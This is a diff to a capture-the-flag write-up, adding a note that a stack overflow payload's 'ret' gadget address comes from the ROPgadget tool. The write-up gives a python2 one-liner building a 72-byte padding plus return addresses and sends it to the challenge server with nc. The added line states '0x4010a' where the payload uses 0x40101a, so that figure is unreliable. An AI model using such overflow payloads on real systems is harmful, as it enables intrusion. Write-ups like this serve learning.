@@ -77,7 +77,11 @@ However, at around 3 AM in the morning, one of my teammates sent me [this link](
 
 I kinda understand what gadgets are after reading [this article](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/gadgets), so you should too.
 
-Thus, to exploit the program on the server, we need to create a new payload by placing a `ret` gadget (0x40101a): `python2 -c 'print("A" * 72 + "\x1a\x10\x40\x00\x00\x00\x00\x00" +  "\x8e\x13\x40\x00\x00\x00\x00\x00")' > in.bin`.
+Thus, to exploit the program on the server, we need to create a new payload by placing a `ret` gadget (0x40101a): `python2 -c 'print("A" * 72 + "\x1a\x10\x40\x00\x00\x00\x00\x00" +  "\x8e\x13\x40\x00\x00\x00\x00\x00")' > in.bin`. 
+
+The address `0x4010a` can be found by using the `ROPgadget` tool.
+
+![image](https://github.com/0necloud/CTF-Writeups/assets/60743000/4fbab234-9677-4612-99d9-fed9a2e10abc)
 
 Running the **server's copy** of the program using `nc challs.nusgreyhats.org 30211 < in.bin` prints the actual flag:
 
